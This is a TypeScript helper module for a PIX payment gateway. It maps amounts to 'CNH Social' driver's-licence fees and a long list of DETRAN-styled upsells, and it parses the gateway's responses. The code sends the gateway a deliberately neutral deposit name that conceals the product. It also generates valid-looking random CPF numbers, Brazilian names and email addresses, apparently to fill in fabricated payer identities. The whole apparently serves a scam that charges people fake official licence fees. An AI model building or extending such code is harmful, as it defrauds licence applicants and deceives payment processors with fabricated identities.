/**
 * Helpers de produto, documento e leitura da resposta do gateway.
 * A chamada HTTP do PIX fica em mangofy.ts.
 */

import { str } from './http';

// -----------------------------------------------------------------------------
// Payload de criacao
// -----------------------------------------------------------------------------

/** Mesma tabela de produto por valor do PHP (cnh_product_from_amount). */
export function productFromAmount(amount: number, origin = ''): {
  type: string;
  name: string;
  isUpsell: boolean;
} {
  const a = Math.round(amount * 100) / 100;
  const o = str(origin).toLowerCase().trim();
  const MAIN_PRICE = 65.7;
  const map: Record<string, [string, string, boolean]> = {
    '65.70': ['cnh', 'CNH Social - Taxa de Emissao', false],
    '79.40': ['cnh', 'CNH Social - Taxa de Emissao', false],
    '45.99': ['cnh_ds', 'CNH Social - Taxa de Emissao (DS)', false],
    '38.79': ['emissao', 'Taxa de Emissao da CNH', true],
    '44.60': ['exame_medico', 'Taxa do Exame Medico', true],
    '27.86': ['psicotecnico', 'Taxa da Avaliacao Psicologica', true],
    '24.90': ['biometria', 'Coleta Biometrica e Foto Digital', true],
    '34.90': ['prova_teorica', 'Agendamento da Prova Teorica', true],
    '44.90': ['aulas_praticas', 'Taxa das Aulas Praticas', true],
    '32.90': ['prova_pratica', 'Agendamento do Exame de Direcao', true],
    '29.90': ['renach', 'Registro no RENACH', true],
    '17.90': ['prioridade', 'Atendimento Prioritario DETRAN', true],
    '27.90': ['envio', 'Envio Expresso da CNH', true],
    '19.90': ['seguro', 'Seguro CNH Protegida', true],
    '14.90': ['pelicula', 'Pelicula Antifraude Oficial', true],
    '9.90': ['premium', 'Acesso Premium CNH Digital', true],
    '54.40': ['emissao', 'Taxa de Emissao da CNH', true],
    '47.80': ['exame_medico', 'Taxa do Exame Medico', true],
    '39.90': ['psicotecnico', 'Taxa da Avaliacao Psicologica', true],
  };
  const k = a.toFixed(2);
  if (map[k]) {
    let type = map[k][0];
    if (type === 'cnh' && o === 'br') type = 'cnh_br';
    if (type === 'cnh' && o === 'ds') type = 'cnh_ds';
    return { type, name: map[k][1], isUpsell: map[k][2] };
  }
  if (o === 'br') return { type: 'cnh_br', name: 'CNH Social - Taxa (BR)', isUpsell: false };
  if (o === 'ds') return { type: 'cnh_ds', name: 'CNH Social - Taxa (DS)', isUpsell: false };
  return { type: 'cnh', name: 'CNH Social - Taxa', isUpsell: a < MAIN_PRICE };
}

/** Nome NEUTRO exibido no gateway (generic_deposit_name do PHP). */
export function genericDepositName(productType: string): string {
  const prefix = 'CS Depósito PIX';
  const map: Record<string, string> = {
    cnh: '',
    cnh_br: 'BR',
    cnh_ds: 'DS',
    emissao: '1',
    exame_medico: '2',
    psicotecnico: '3',
    biometria: '4',
    prova_teorica: '5',
    aulas_praticas: '6',
    prova_pratica: '7',
    renach: '8',
    prioridade: '9',
    envio: '10',
    seguro: '11',
    pelicula: '12',
    premium: '13',
  };
  const key = str(productType).toLowerCase().trim();
  if (key && map[key] !== undefined) return map[key] ? `${prefix} ${map[key]}` : prefix;
  return prefix;
}

/** CPF valido (11 digitos) — generate_valid_cpf do PHP. */
export function generateValidCpf(): string {
  const n: number[] = [];
  for (let i = 0; i < 9; i++) n.push(Math.floor(Math.random() * 10));
  if (new Set(n).size === 1) n[8] = (n[8] + 1) % 10;
  let d1 = 0;
  for (let i = 0; i < 9; i++) d1 += n[i] * (10 - i);
  d1 = (d1 * 10) % 11;
  if (d1 === 10) d1 = 0;
  n.push(d1);
  let d2 = 0;
  for (let i = 0; i < 10; i++) d2 += n[i] * (11 - i);
  d2 = (d2 * 10) % 11;
  if (d2 === 10) d2 = 0;
  n.push(d2);
  return n.join('');
}

const BR_FIRST = [
  'Ana', 'Maria', 'Mariana', 'Juliana', 'Fernanda', 'Camila', 'Beatriz', 'Larissa', 'Patricia',
  'Aline', 'Amanda', 'Bruna', 'Carolina', 'Leticia', 'Vanessa', 'Gabriela', 'Debora', 'Renata',
  'Sandra', 'Adriana', 'Claudia', 'Luana', 'Tatiane', 'Jessica', 'Priscila', 'Carla', 'Rafaela',
  'Bianca', 'Sabrina', 'Daniela', 'Eduarda', 'Isabela', 'Joao', 'Jose', 'Pedro', 'Paulo', 'Carlos',
  'Lucas', 'Gabriel', 'Rafael', 'Mateus', 'Bruno', 'Felipe', 'Gustavo', 'Rodrigo', 'Marcelo',
  'Fernando', 'Ricardo', 'Eduardo', 'Daniel', 'Thiago', 'Vinicius', 'Leonardo', 'Andre', 'Fabio',
  'Marcos', 'Diego', 'Anderson', 'Wesley', 'Alex', 'Caio', 'Henrique', 'Igor', 'Murilo',
];
const BR_LAST = [
  'Silva', 'Santos', 'Oliveira', 'Souza', 'Lima', 'Pereira', 'Ferreira', 'Costa', 'Rodrigues',
  'Almeida', 'Nascimento', 'Carvalho', 'Araujo', 'Ribeiro', 'Gomes', 'Martins', 'Rocha', 'Barbosa',
  'Alves', 'Melo', 'Cardoso', 'Teixeira', 'Correia', 'Cavalcante', 'Dias', 'Castro', 'Campos',
  'Moreira', 'Mendes', 'Nunes', 'Marques', 'Freitas', 'Pinto', 'Moraes', 'Ramos', 'Monteiro',
  'Vieira', 'Batista', 'Andrade', 'Lopes', 'Fernandes', 'Machado', 'Barros', 'Cunha', 'Borges',
];
const DDDS = ['11', '21', '31', '41', '51', '61', '71', '81', '85', '19', '27', '48', '62', '98'];

const pick = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];

export function randomBrName(): string {
  return `${pick(BR_FIRST)} ${pick(BR_LAST)}`;
}

function slugForEmail(name: string): string {
  return name
    .normalize('NFD')
    .replace(/[\u0300-\u036f]/g, '')
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '')
    .slice(0, 24);
}

export function emailFromName(name: string): string {
  const providers = ['gmail.com', 'hotmail.com', 'outlook.com', 'yahoo.com.br', 'icloud.com'];
  let slug = slugForEmail(name);
  if (slug === '') slug = 'cliente';
  const sep = Math.random() < 0.5 ? '.' : '';
  const num = String(Math.floor(Math.random() * 9999) + 1);
  return `${slug}${sep}${num}@${pick(providers)}`;
}

// -----------------------------------------------------------------------------
// Leitura da resposta (extract_* do PHP)
// -----------------------------------------------------------------------------

export function pickVal(arr: unknown, keys: string[]): unknown {
  if (!arr || typeof arr !== 'object' || Array.isArray(arr)) return null;
  const o = arr as Record<string, unknown>;
  for (const k of keys) {
    const v = o[k];
    if (v !== undefined && v !== null && (typeof v === 'object' || String(v).trim() !== '')) return v;
  }
  return null;
}

export function extractTransactionObject(decoded: unknown): Record<string, unknown> | null {
  if (!decoded || typeof decoded !== 'object') return null;
  const d = decoded as Record<string, unknown>;
  if (
    d.transaction_id !== undefined ||
    d.status !== undefined ||
    d.payment_status !== undefined ||
    d.payment_code !== undefined ||
    d.pix_copy_paste !== undefined ||
    d.paymentMethod !== undefined
  ) {
    return d;
  }
  for (const key of ['sale', 'data', 'transaction', 'transactions', 'result', 'item']) {
    const inner = d[key];
    if (inner && typeof inner === 'object' && !Array.isArray(inner)) {
      const ii = inner as Record<string, unknown>;
      if (ii.transaction_id !== undefined || ii.id !== undefined || ii.status !== undefined) return ii;
    }
    if (Array.isArray(inner) && inner[0] && typeof inner[0] === 'object') {
      return inner[0] as Record<string, unknown>;
    }
  }
  if (Array.isArray(decoded) && decoded[0] && typeof decoded[0] === 'object') {
    return decoded[0] as Record<string, unknown>;
  }
  return d;
}

/** Somente campos que existem APÓS o pagamento (nunca created_at/updated_at). */
export function extractPayedAt(tx: unknown): string | null {
  if (!tx || typeof tx !== 'object') return null;
  const o = tx as Record<string, unknown>;
  for (const k of ['date_approved', 'paid_at', 'payedAt', 'paidAt', 'paid_date', 'approved_at']) {
    const v = o[k];
    if (typeof v === 'string' && v.trim() !== '') return v;
  }
  return null;
}

export function extractPixCode(tx: unknown, decoded: unknown): string | null {
  for (const src of [tx, decoded]) {
    const direct = pickVal(src, [
      'pix_copy_paste', 'copy_paste', 'pixQrCode', 'qr_code', 'qrcode', 'brcode', 'emv', 'payload',
    ]);
    if (typeof direct === 'string' && direct !== '') return direct;
  }
  for (const src of [tx, decoded]) {
    if (!src || typeof src !== 'object') continue;
    const s = src as Record<string, unknown>;
    const objs: unknown[] = [];
    if (s.pix && typeof s.pix === 'object') objs.push(s.pix);
    if (s.payment && typeof s.payment === 'object') {
      const pay = s.payment as Record<string, unknown>;
      if (pay.pix && typeof pay.pix === 'object') objs.push(pay.pix);
    }
    if (s.pixInformation && typeof s.pixInformation === 'object') objs.push(s.pixInformation);
    for (const o of objs) {
      const code = pickVal(o, [
        'pix_qrcode_text', 'key', 'code', 'copy_paste', 'pix_copy_paste', 'qrcode', 'qr_code', 'qrCode', 'emv', 'payload',
      ]);
      if (typeof code === 'string' && code !== '') return code;
    }
  }
  return null;
}

export function extractPixQr(tx: unknown, decoded: unknown): string | null {
  for (const src of [tx, decoded]) {
    const direct = pickVal(src, [
      'pix_qr_code_url', 'qr_code_url', 'qr_code_image', 'pixQrCodeImage', 'qrCodeImage',
      'qrCodeBase64', 'qr_code_base64', 'base64',
    ]);
    if (typeof direct === 'string' && direct !== '') return direct;
  }
  for (const src of [tx, decoded]) {
    if (!src || typeof src !== 'object') continue;
    const s = src as Record<string, unknown>;
    const objs: unknown[] = [];
    if (s.pix && typeof s.pix === 'object') objs.push(s.pix);
    if (s.payment && typeof s.payment === 'object') {
      const pay = s.payment as Record<string, unknown>;
      if (pay.pix && typeof pay.pix === 'object') objs.push(pay.pix);
    }
    if (s.pixInformation && typeof s.pixInformation === 'object') objs.push(s.pixInformation);
    for (const o of objs) {
      const qr = pickVal(o, [
        'pix_qrcode_image', 'qrCodeBase64', 'qr_code', 'base64', 'image', 'qr_code_url', 'qr_code_image', 'pix_qr_code_url',
      ]);
      if (typeof qr === 'string' && qr !== '') return qr;
    }
  }
  return null;
}

/** Mensagem de erro amigavel (disrupty_error_message do PHP). */
export function errorMessage(decoded: unknown, fallback: string): string {
  if (typeof decoded === 'string' && decoded.trim() !== '') return decoded.trim();
  if (decoded && typeof decoded === 'object' && !Array.isArray(decoded)) {
    const d = decoded as Record<string, unknown>;
    if (Array.isArray(d.message)) {
      const msgs = d.message.filter((m): m is string => typeof m === 'string' && m !== '');
      if (msgs.length) return msgs.join('; ');
    }
    if (d.error && typeof d.error === 'object') {
      const err = d.error as Record<string, unknown>;
      const msg = typeof err.message === 'string' ? err.message : '';
      const parts: string[] = [];
      if (err.details && typeof err.details === 'object') {
        const details = err.details as Record<string, unknown>;
        for (const [field, msgs] of Object.entries(details)) {
          const prefix = field ? `[${field}] ` : '';
          if (Array.isArray(msgs)) {
            for (const m of msgs) if (typeof m === 'string') parts.push(prefix + m);
          } else if (typeof msgs === 'string') {
            parts.push(prefix + msgs);
          }
        }
      }
      if (parts.length) return (msg ? `${msg}: ` : '') + parts.join('; ');
      if (msg) return msg;
    }
    if (d.errors && typeof d.errors === 'object' && !Array.isArray(d.errors)) {
      const parts: string[] = [];
      for (const [field, msgs] of Object.entries(d.errors as Record<string, unknown>)) {
        const prefix = field ? `[${field}] ` : '';
        if (Array.isArray(msgs)) {
          for (const m of msgs) if (typeof m === 'string') parts.push(prefix + m);
        } else if (typeof msgs === 'string') {
          parts.push(prefix + msgs);
        }
      }
      const msg = typeof d.message === 'string' ? d.message : '';
      if (parts.length) return (msg ? `${msg}: ` : '') + parts.join('; ');
    }
    for (const k of ['message', 'error', 'error_description', 'detail']) {
      if (typeof d[k] === 'string' && d[k] !== '') return d[k] as string;
    }
  }
  if (Array.isArray(decoded) && typeof decoded[0] === 'string') return decoded[0] as string;
  return fallback;
}
